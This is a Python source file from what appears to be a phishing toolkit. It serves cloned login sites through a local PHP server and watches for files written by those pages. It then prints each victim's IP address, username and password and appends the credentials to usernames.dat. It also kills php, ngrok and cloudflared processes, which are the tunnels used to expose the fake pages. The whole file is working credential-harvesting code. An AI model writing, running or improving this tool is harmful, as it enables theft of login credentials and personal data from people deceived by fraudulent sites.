from libraries import *

HOST = '127.0.0.1'
PORT = '8080'



def capture_creds():
    print("Event Capture")
    file_path = f"{os.getcwd()}/usernames.txt"
    with open(file_path, "r") as file:
        lines = file.readlines()
        print(f"File Content: {lines}")  # Print file content for debugging

        ACCOUNT = [line.split(":")[1].strip() for line in lines if "Username:" in line][0]
        PASSWORD = [line.split(":")[1].strip() for line in lines if "Pass:" in line][0]

        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Account : {BLUE}{ACCOUNT}")
        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Password : {BLUE}{PASSWORD}")
        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}usernames.dat")

        with open("usernames.dat", "a") as usernames_file:
            usernames_file.writelines(lines)

        print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Next Login Info, {BLUE}Ctrl + C {ORANGE}to exit. ")



def capture_data():
    print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit...")
    while True:
        if os.path.exists(f"{os.getcwd()}/ip.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found !")
            capture_ip()
            os.remove(f'{os.getcwd()}/ip.txt')

        time.sleep(0.75)

        if os.path.exists(f"{os.getcwd()}/usernames.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found !!")
            capture_creds()
            os.remove(f"{os.getcwd()}/usernames.txt")

        time.sleep(0.75)
        
def setup_site(website):
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")
    os.system(f"cp -rf .sites/{website}/* .server/www")
    os.system("cp -f .sites/ip.php .server/www/")
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")
    os.chdir(".server/www")
    subprocess.Popen(["php", "-S", f"{HOST}:{PORT}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def capture_ip():
    with open(f"{os.getcwd()}/ip.txt", "r") as file:
        lines = file.readlines()
        IP = [line.split(" ")[1].strip() for line in lines if "IP:" in line][0]
        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Victim's IP : {BLUE}{IP}")
        with open("ip.txt", "a") as ip_file:
            ip_file.writelines(lines)


def start_localhost(website):
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    setup_site(website)
    time.sleep(1)
    clear()
    banner_small()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at : {GREEN}{CYAN}http://{HOST}:{PORT} {GREEN}")
    capture_data()

def check_php_server():
    try:
        response = requests.get(f"http://{HOST}:{PORT}")
        if response.status_code == 200:
            print(f"\n{GREEN}[INFO] PHP server is running.")
            return True
        else:
            print(f"\n{RED}[ERROR] PHP server returned status code {response.status_code}.")
            return False
    except Exception as e:
        print(f"\n{RED}[ERROR] Failed to connect to PHP server. Exception: {e}")
        return False


def kill_pid():
    # Kill PHP process
    if os.system("pidof php"):
        os.system("killall php > /dev/null 2>&1")

    # Kill ngrok process
    if os.system("pidof ngrok"):
        os.system("killall ngrok > /dev/null 2>&1")

    # Kill cloudflared process
    if os.system("pidof cloudflared"):
        os.system("killall cloudflared > /dev/null 2>&1")